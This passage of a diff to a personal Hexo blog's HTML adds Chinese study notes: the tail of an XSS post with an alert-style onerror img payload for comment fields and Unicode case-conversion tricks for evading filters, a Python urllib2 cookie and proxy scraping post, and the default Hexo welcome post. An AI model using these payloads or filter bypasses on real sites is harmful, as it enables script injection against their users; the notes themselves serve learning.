+<p>c.类似于评论区的，可以提交自己的信息的<br><br> ①若没有过滤<img标签><br><br> 在<img>标签中插入onload事件，（自己创建一个可以放入xss的地方）  </img标签></p>
+<pre><code>&lt;img src=&quot;&quot; onerror=&quot;alert(&apos;xss&apos;)&quot;&gt;
+</code></pre><p>d.若页面转换照片通过url后面的参数来转换</p>
+<p>e.使用了字母大小写的转换：<br></p>
+<blockquote>
+<ul>
+<li>toLocaleUpperCase 将字符串中所有的字母字符都将被转换为大写的，同时适应宿主环境的当前区域设置。</li>
+</ul>
+<ul>
+<li>toUpperCase 将字符串中的所有字母都被转化为大写字母。</li>
+</ul>
+<ul>
+<li>toLocaleLowerCase 将字符串所有的字母字符都被转换为小写，同时考虑到宿主环境的当前区域设置。</li>
+</ul>
+<ul>
+<li>toLowerCase 将字符串中的字母被转换为小写字母。</li>
+</ul>
+</blockquote>
+<p>toUpperCase():<br><br> ı ==&gt;I<br><br> ſ ==&gt;S<br></p>
+<p> toLowerCase():<br><br> İ ==&gt;i<br><br> K ==&gt;k<br></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/python爬虫的一些小知识点/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="Shirley">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/myslef.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="TobeFine">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="TobeFine" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/11/26/python爬虫的一些小知识点/" itemprop="url">
+                  python爬虫的一些小知识点
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-26T21:23:44+08:00">
+                2017-11-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/11/26/python爬虫的一些小知识点/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/26/python爬虫的一些小知识点/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>-</p>
+<blockquote>
+<p><strong>关于cookielib</strong></p>
+</blockquote>
+<p>1&gt;cookie:有一些网站在cookie未启用的时候无法浏览，而cookie是用于某些网站辨别用户身份，进行session跟踪而存储在 用户本地终端 上的数据（比如说有些网站需要登录后才能访问某个页面，在登录之前，你想抓取某个页面内容是不允许的。那么我们可以利用Urllib2库保存我们登录的Cookie，然后再抓取其他页面就达到目的了。）</p>
+<p> 2&gt;打开网页的console，刷新页面之后，在network中会有Request Headers，其中就有cookie</p>
+<p>当我们(客户端）输入URL请求页面后，我们即给web服务端发送了一个要求（request），web server根据Request生产响应的response，发回给我们（客户端），然后解析Response的html，我们就可以看到页面</p>
+<p> –当网站发送页面到客户端时（服务器发送给客户端），会发送Headers来描述HTTP事物，送回来的headers（response headers）中包含一些有cookie的文本。如果此时想要从相同的服务器返回其他页面（客户端请求其他页面），那么cookie就必须作为请求的handler（request handler）传送给服务器，这就意味着cookies会存储一些信息让服务器来识别你。</p>
+<pre><code>#其中一种获取网页的方式#
+cj =cookielib.CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+urllib2.install_opener(opener)
+response3 = urllib2.urlopen(url)
+print response3.getcode()
+print cj
+print response3.read()
+</code></pre><blockquote>
+<p><strong>关于CookieJar()</strong></p>
+</blockquote>
+<p>cookielib.CookieJar用于存储cookie对象，此模块捕获cookie并在后续连接请教时重新发送，还可以用来处理包含cookie数据文件</p>
+<blockquote>
+<p><strong>关于opener和handlers</strong></p>
+</blockquote>
+<p>1&gt;opener:当你获取一个URL的时候，你就使用一个opener(一个urllib2.OpenerDirector的实例) 默认的opener也就是我们常用的urlopen。它是一个特殊的opener，传入的参数仅仅是url,data,timeout(可以注意到并没有cookie，说明在某些网页中无法使用这种方法抓取数据），如果我们需要用到cookie，就需要创建更一般的opener来实现对Cookie的设置</p>
+<p>-<br><strong>自定义opener</strong></p>
+<pre><code>#使用build_opener()
+opener = urllib2.build_opener([handler1[handler2...]])
+</code></pre><p>参数handler是Handler实例，常用的有HTTPBasicAuthHandler、HTTPCookieProcessor、ProxyHandler等</p>
+<p>①<strong>修改http报头</strong></p>
+<pre><code>import urllib2
+opener = urllib2.build_opener()
+opener.addheaders = [(&apos;User-agent&apos;, &apos;Mozilla/5.0&apos;)]
+opener.open(url)
+</code></pre><p>②<strong>install_opener(opener)</strong><br>安装不同的opener对象作为urlopen()使用的全局opener</p>
+<pre><code>opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+urllib2.install_opener(opener)
+response3 = urllib2.urlopen(url)
+</code></pre><p>③<strong>密码验证（HTTPBasicAuthHandler</strong>）<br>HTTPBasicAuthHandler()处理程序可用add_password()来设置密码。</p>
+<pre><code>h.add_password(远程关联的名称,基URL,user,passwd)
+</code></pre><p>-</p>
+<pre><code>import urllib2
+auth=urllib2.HTTPBasicAuthHandler()
+auth.add_password(&apos;Administrator&apos;,&apos;http://www.example.com&apos;,&apos;Dave&apos;,&apos;123456&apos;)
+opener=urllib2.build_opener(auth)
+u=opener.open(URL)
+</code></pre><p>④<strong>Cookie处理(HTTPCookieProcessor)</strong></p>
+<pre><code>import urllib2,cookielib
+cookie=cookielib.CookieJar()
+cookiehand=urllib2.HTTPCookieProcessor(cookie)
+opener=urllib2.build_opener(cookiehand)
+</code></pre><p>⑤<strong>代理(ProxyHandler)-</strong><br>ProxyHandler(proxies)参数proxies是一个字典，将协议名称（http，ftp）等映射到相应代理服务器的URL。</p>
+<pre><code>proxy=ProxyHandler({&apos;http&apos;:&apos;http://someproxy.com:8080&apos;})
+auth=HTTPBasicAuthHandler()
+auth.add_password()
+opener=build_opener(auth,proxy)
+</code></pre><p>-</p>
+<hr>
+<p><strong>实例爬虫</strong></p>
+<blockquote>
+<p>1.确定抓取的目标：<br>-通过网页”检查元素”的操作可以确定该网页的url格式，数据格式和网页编码</p>
+<p>2.分析目标</p>
+<p>3.编写代码<br>在一个包中写入：总程序调度文件、URL管理器文件、HTML下载器文件、HTML解析器文件、HTML输出器文件</p>
+</blockquote>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://github.com/ShirleyLiuhy/ShirleyLiuhy.github.io.git/2017/11/26/hello-world/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="Shirley">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/myslef.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="TobeFine">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="TobeFine" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/11/26/hello-world/" itemprop="url">
+                  Hello World
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-26T21:23:44+08:00">
+                2017-11-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/11/26/hello-world/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/26/hello-world/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 
           
         
@@ -1202,7 +1388,7 @@ document.getElementByClassName(&apos;ui-button-text&apos;)[0].click() //确认�
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
